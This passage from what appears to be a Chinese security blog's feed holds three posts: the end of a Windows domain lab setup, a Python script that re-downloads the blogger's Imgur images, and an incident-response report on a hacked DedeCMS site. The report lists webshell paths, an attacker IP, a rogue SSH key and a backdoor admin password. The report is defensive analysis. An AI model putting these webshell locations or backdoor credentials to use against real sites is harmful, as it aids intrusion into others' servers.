2008</td><td align="center">Windows Server 2008<br/>Windows Server 2008 R2<br/>Windows Server 2012<br/> Windows Server 2012 R2<br/> Windows Server 2016</td></tr><tr><td align="center">Windows Server 2008 R2</td><td align="center">Windows Server 2008 R2<br/>Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2012</td><td align="center">Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2012 R2</td><td align="center">Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2016</td><td align="center">Windows Server 2016</td></tr></tbody></table><h3 id="下一步可能会报错"><a href="#下一步可能会报错" class="headerlink" title="下一步可能会报错"></a>下一步可能会报错</h3><p><img src="/images/1555399686608.png" alt="1555399686608"></p><p>点击确定</p><h3 id="设置NetBIOS名称"><a href="#设置NetBIOS名称" class="headerlink" title="设置NetBIOS名称"></a>设置<code>NetBIOS</code>名称</h3><p><img src="/images/1555399767129.png" alt="1555399767129"></p><h3 id="设置相关文件保存路径"><a href="#设置相关文件保存路径" class="headerlink" title="设置相关文件保存路径"></a>设置相关文件保存路径</h3><p><img src="/images/1555399847947.png" alt="1555399847947"></p><h3 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h3><p><img src="/images/1555399865562.png" alt="1555399865562"></p><h3 id="先决条件检查后安装"><a href="#先决条件检查后安装" class="headerlink" title="先决条件检查后安装"></a>先决条件检查后安装</h3><p><img src="/images/1555399916776.png" alt="1555399916776"></p><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><p><img src="/images/1555399985071.png" alt="1555399985071"></p><h3 id="重连域控服务器"><a href="#重连域控服务器" class="headerlink" title="重连域控服务器"></a>重连域控服务器</h3><p><img src="/images/1555400178193.png" alt="1555400178193"></p><h3 id="安装成功"><a href="#安装成功" class="headerlink" title="安装成功"></a>安装成功</h3><p><img src="/images/1555400464798.png" alt="1555400464798"></p><h3 id="其他服务器加入该域"><a href="#其他服务器加入该域" class="headerlink" title="其他服务器加入该域"></a>其他服务器加入该域</h3><p><strong>10.16.11.15</strong></p><p>IP地址指向本地IP，DNS服务器地址需指向域控制器中的IP地址，单击【确定】</p><p><img src="/images/1555400566074.png" alt="1555400566074"></p><p>加入域</p><p><img src="/images/1555401424324.png" alt="1555401424324"></p><p>加入后提示如下</p><p><img src="/images/1555401458667.png" alt="1555401458667"></p><p>然后重启</p><p><img src="/images/1555401470668.png" alt="1555401470668"></p><p>重连</p><p><img src="/images/1555401827397.png" alt="1555401827397"></p><p><img src="/images/1555401872455.png" alt="1555401872455"></p><p><strong>10.16.11.16</strong></p><p>改DNS</p><p><img src="/images/1555401696318.png" alt="1555401696318"></p><p>入域</p><p><img src="/images/1555401727613.png" alt="1555401727613"></p><p>填写域控的帐号密码</p><p><img src="/images/1555401756555.png" alt="1555401756555"></p><p>成功入域</p><p><img src="/images/1555401771710.png" alt="1555401771710"></p><p>重启</p><p><img src="/images/1555401793089.png" alt="1555401793089"></p><p>重连</p><p><img src="/images/1555401926957.png" alt="1555401926957"></p><p><img src="/images/1555401970465.png" alt="1555401970465"></p><p><strong>10.16.11.18</strong></p><p>改DNS</p><p><img src="/images/1555402026565.png" alt="1555402026565"></p><p>加入域</p><p><img src="/images/1555402087632.png" alt="1555402087632"></p><p>输入域控的帐号密码然后成功入域</p><p><img src="/images/1555402124899.png" alt="1555402124899"></p><p><strong>10.16.11.19</strong></p><p>改DNS</p><p><img src="/images/1555404029164.png" alt="1555404029164"></p><p>入域</p><p><img src="/images/1555404275419.png" alt="1555404275419"></p><p>加入域</p><p><img src="/images/1555404289864.png" alt="1555404289864"></p><p>重启</p><p><img src="/images/1555404303100.png" alt="1555404303100"></p><p>重连</p><p><img src="/images/1555405589336.png" alt="1555405589336"></p><p><img src="/images/1555405687304.png" alt="1555405687304"></p><p>至此，域环境搭建完毕</p><p><img src="/images/1555405811454.png" alt="1555405811454"></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更换博客图片为本地</title>
      <link href="/p/f5f8.html"/>
      <url>/p/f5f8.html</url>
      
        <content type="html"><![CDATA[<p>没注意Imgur被墙了，把博客上的图下载回来重传到GitHub上</p><span id="more"></span><p>因为之前用的<code>PicGo</code>这款软件，所以直接用<code>Sublime Text 3</code>写个正则<code>(https://.*)(\.png|jpg)</code>从<code>C:\Users\Administrator\AppData\Roaming\PicGo\data.json</code>里提取下图片链接</p><p><img src="/images/1555038588204.png" alt="1555038588204"></p><p>提取后写个小脚本，直接保存到博客目录的<code>/source/images/</code>下</p><p><img src="/images/1555038673442.png" alt="1555038673442"></p><p>代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: Sp4ce</span></span><br><span class="line"><span class="string">@Github: https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="string">@LastEditors: Sp4ce</span></span><br><span class="line"><span class="string">@Date: 2019-04-12 09:56:07</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-04-12 11:12:20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">USER_AGENTS 随机头信息</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">要爬的图片</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">url = [<span class="string">&quot;https://i.imgur.com/kE3atnM.jpg&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/K0ir4GS.jpg&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/IGl4o0B.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/xCyyXjU.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/c245pIe.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/8P1fu00.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/iTJfqEf.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/0Y7xwUl.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/W094eVA.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/yOXYcFY.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/nSGClOf.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/SjrKLsD.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/J2a5zf3.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/kSISTKX.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/S736bs1.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/PjRWXTZ.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/yruh3Pq.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/s38MFFX.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/sPE20Hb.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/Ye7UZud.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/xMzzCZJ.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/esB7tyE.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/cvxCVx1.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/bD6y8ZP.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/4EXOh4m.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/fO5cyZG.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/DIdK6Z2.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/VlpAP9x.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/vFfnPmR.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/33OQjRC.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/tC5ULwB.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/RRpquVF.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/tqlK5nk.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/ekaoutn.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/EdUQG81.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/5wHxY18.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/o4JmAOC.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/y6oQvSz.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/NII0BB1.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/So4QQQi.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/KAqDDXX.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/IeVvnxj.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/ofCS3YD.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/jOkSclQ.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/xI2gMw7.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/LbTCSRm.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/XLntPfM.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/JtgcTUf.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/m0ZsPMQ.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/oBvtki7.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/mHkYCIg.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/z3MZ1bQ.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/z9yE9WC.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/I6kUFLf.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/XZ5CSOb.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/IwcYFcO.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/3Uu0tpL.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/rSPg1hK.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/Mn1ZkmD.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/GLCnFCF.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/5JxxULl.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/H67jYWx.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/VMs1r1r.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/MtBdViP.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/Vt2YN9X.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/Fqrmmzf.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/llan4IP.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/VUPv5h2.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/k2T81yl.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/ZNfTCeU.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/THTBupL.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/0Yb4UVs.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/fN8UQ4p.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/ft1JSYE.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/Jl5iYlS.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/fCmtfmQ.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/bgbVlHY.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/V8UFiNW.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/KEPMTDJ.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/cDK4uAr.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/tgu1VRB.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/Bgo9UZt.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/2fTNylb.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/3jGpBn8.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/aMnIsaI.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/qDqUgTU.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/t0d7dFH.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/el9mg3o.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/eKrIdl7.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/jztCtrX.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/27OOfqx.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/Xk04H89.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/TgaG9LZ.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/Wr1vQVq.png&quot;</span>,</span><br><span class="line">       <span class="string">&quot;https://i.imgur.com/MDlt5N1.png&quot;</span>]</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: choice(USER_AGENTS)&#125;</span><br><span class="line">folder_path = <span class="string">&#x27;path/to/hexo/blog/source/images/&#x27;</span>  <span class="comment"># 保存的图片目录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getImgurPic</span>(<span class="params">url</span>):</span><br><span class="line">    response = requests.get(url, proxies=proxies, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span>+url+<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(response.status_code))</span><br><span class="line">    saveImg(renameImg(url),response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">renameImg</span>(<span class="params">imgUrl</span>):</span><br><span class="line">    imgExt = imgUrl.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    imgName = imgUrl.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">2</span>]</span><br><span class="line">    imgName = imgName.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    img_name = folder_path + imgName + <span class="string">&#x27;.&#x27;</span> + imgExt</span><br><span class="line">    <span class="keyword">return</span> img_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">saveImg</span>(<span class="params">imgName,response</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(imgName, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:  <span class="comment"># 以byte形式将图片数据写入</span></span><br><span class="line">        file.write(response.content)</span><br><span class="line">        file.flush()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] &#x27;</span> + <span class="string">&#x27;图片：&#x27;</span>+imgName+ <span class="string">&#x27; 保存完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> imgUrl <span class="keyword">in</span> url:</span><br><span class="line">        getImgurPic(imgUrl)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终结果</p><p><img src="/images/1555038827528.png" alt="1555038827528"></p><p>搞定，替换掉md文件中的链接即可</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/p/be58.html"/>
      <url>/p/be58.html</url>
      
        <content type="html"><![CDATA[<p>接到个单子，网站被挂博彩</p><span id="more"></span><h1 id="客户机器环境"><a href="#客户机器环境" class="headerlink" title="客户机器环境"></a>客户机器环境</h1><ul><li>服务器系统：CentOS 7</li><li>服务器管理面板：宝塔</li><li>CMS：织梦CMS V57 SP2</li></ul><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>向客户了解情况后，登录了服务器进行检查，发现历史执行过的命令有些异常，系统帐号被添加了<code>admin</code>，用户组为<code>admin</code>，向客户确认后为客户所执行，帐号非客户所添加</p><p><img src="/images/20190412235526.jpg" alt="20190412235526"></p><p><img src="/images/1555084740738.png" alt="1555084740738"></p><h1 id="网络检查"><a href="#网络检查" class="headerlink" title="网络检查"></a>网络检查</h1><p>随后执行了<code>netstat -anutlp</code>对当前连接进行了检查，无异常，初步判定没有被留远控</p><p><img src="/images/1555084845254.png" alt="1555084845254"></p><h1 id="SSH检查"><a href="#SSH检查" class="headerlink" title="SSH检查"></a>SSH检查</h1><p>对<code>SSH配置文件</code>、<code>SSH应用程序</code>进行了检查，</p><p><code>SSH</code>程序正常</p><p><img src="/images/1555085209260.png" alt="1555085209260"></p><p><code>SSH配置文件</code>发现被设置了<code>ssh key</code></p><p><img src="/images/1555084968047.png" alt="1555084968047"></p><p><img src="/images/1555084989451.png" alt="1555084989451"></p><h1 id="文件检测-amp-日志分析"><a href="#文件检测-amp-日志分析" class="headerlink" title="文件检测&amp;日志分析"></a>文件检测&amp;日志分析</h1><h2 id="文件检测"><a href="#文件检测" class="headerlink" title="文件检测"></a>文件检测</h2><p>由于客户机器上运行着4个站点，所以<code>down</code>了相关网站文件和日志，网站文件使用D盾进行了扫描，发现其中2个<code>织梦CMS</code>站点都被传了<code>Shell</code></p><p><img src="/images/1555085421641.png" alt="1555085421641"></p><p>shell路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/m.xxx.com/anli/list_2.php</span><br><span class="line">/m.xxx.com/data/enums/bodytypes.php</span><br><span class="line">/m.xxx.com/data/module/moduleurllist.php</span><br><span class="line">/m.xxx.com/images/js/ui.core.php</span><br><span class="line">/m.xxx.com/include/ckeditor/plugins/iframe/images/indax.php</span><br><span class="line">/m.xxx.com/install/config.cache.inc.php</span><br><span class="line">/m.xxx.com/member/ajax_loginsta.php</span><br><span class="line">/m.xxx.com/plus/arcmulti.php</span><br><span class="line">/m.xxx.com/plus/img/face/list_2_2.php</span><br><span class="line">/m.xxx.com/templets/default/style/touchslide.1.1.php</span><br><span class="line">/m.xxx.com/tuiguang/18.html.php</span><br><span class="line">/www.xxx.com/anli/list_1.php</span><br><span class="line">/www.xxx.com/images/lurd/button_save.php</span><br><span class="line">/www.xxx.com/include/dialog/img/picviewnone.php</span><br><span class="line">/www.xxx.com/include/inc/funstring.php</span><br><span class="line">/www.xxx.com/jianzhan/list_3.php</span><br><span class="line">/www.xxx.com/jinfuzi-seo/css/menuold.php  </span><br><span class="line">/www.xxx.com/plus/img/channellist.php</span><br><span class="line">/www.xxx.com/templets/default/images/banner_03.php</span><br><span class="line">/www.xxx.com/tuiguang/2018/1205/19.php</span><br></pre></td></tr></table></figure><p>其中一个shell</p><p><img src="/images/1555085541989.png" alt="1555085541989"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>使用<code>Apache Log Viewer</code>对日志进行分析，设置了<code>shell</code>文件正则后如下图</p><p><img src="/images/1555085600301.png" alt="1555085600301"></p><p>寻找第一次访问shell的IP</p><p><img src="/images/1555085633502.png" alt="1555085633502"></p><p>最终发现</p><p><img src="/images/1555085667111.png" alt="1555085667111"></p><p><code>IP:117.95.26.92</code>为首次使用<code>网站后门</code>上传其他<code>shell</code>的IP</p><p>由于客户的站点是仿站，模板为网上下载，怀疑存在模板后门的情况，综合日志分析，确认为模板后门</p><p><img src="/images/1555085822400.png" alt="1555085822400"></p><h1 id="处置与意见"><a href="#处置与意见" class="headerlink" title="处置与意见"></a>处置与意见</h1><ol><li>网站中的木马文件已经删除，根据访问日志确认是模板后门造成的此次事件。</li><li>服务器异常账户已经删除，考虑到该异常账户多次成功登录到服务器，而且历史操作中有切换到root用户痕迹，怀疑服务器密码已经泄漏，已建议客户修改。</li><li>数据库检查中发现<a href="http://www.xxx.com/">http://www.xxx.com</a> 存在一个疑似后门的账户，用户名admin. 密码admin1.2.3.</li><li>被篡改的首页已经恢复。</li></ol><h1 id="附：IOC"><a href="#附：IOC" class="headerlink" title="附：IOC"></a>附：IOC</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 